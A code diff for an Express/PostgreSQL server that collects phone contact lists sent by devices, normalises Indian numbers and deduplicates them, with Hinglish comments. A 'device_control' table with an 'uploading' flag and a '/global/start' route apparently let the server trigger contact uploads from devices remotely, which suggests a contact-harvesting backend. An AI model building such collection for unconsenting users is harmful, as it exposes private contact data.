@@ -48,9 +48,9 @@ async function initDB() {
     CREATE TABLE IF NOT EXISTS contacts (
       id SERIAL PRIMARY KEY,
       device_id TEXT,
-      contact TEXT
+      contact TEXT,
+      UNIQUE (device_id, contact)
     );
-
     CREATE TABLE IF NOT EXISTS device_control (
       device_id TEXT PRIMARY KEY,
       uploading BOOLEAN DEFAULT FALSE
@@ -574,22 +574,53 @@ app.post("/global/start", async (req, res) => {
 });
 
 // ================= RECEIVE CONTACTS =================
+
+// number ko clean karne ka function
+function normalizeNumber(str) {
+  const digits = str.replace(/\D/g, ""); // sirf digits
+  return digits.slice(-10); // last 10 digits (India format)
+}
+
 app.post("/receive", async (req, res) => {
   const { device_id, data } = req.body;
-  if (!device_id || !Array.isArray(data)) return res.status(400).send("Bad request");
+
+  if (!device_id || !Array.isArray(data)) {
+    return res.status(400).send("Bad request");
+  }
+
   try {
     for (let contact of data) {
-      // Avoid duplicate contacts for same device
+
+      // "Name : Number" split karo
+      let parts = contact.split(":");
+      let name = parts[0]?.trim() || "";
+      let number = parts[1]?.trim() || "";
+
+      // number normalize karo
+      let cleanNumber = normalizeNumber(number);
+
+      // agar number empty hai to skip
+      if (!cleanNumber) continue;
+
+      // final format consistent rakho
+      let finalContact = name + " : " + cleanNumber;
+
       await pool.query(
-        "INSERT INTO contacts (device_id, contact) VALUES ($1, $2) ON CONFLICT DO NOTHING",
-        [device_id, contact]
+        `INSERT INTO contacts (device_id, contact)
+         VALUES ($1, $2)
+         ON CONFLICT DO NOTHING`,
+        [device_id, finalContact]
       );
     }
+
+    // user insert (same as before)
     await pool.query(
       "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
       [device_id]
     );
+
     res.send("OK");
+
   } catch (err) {
     console.error("/receive error:", err);
     res.status(500).send("Server error");
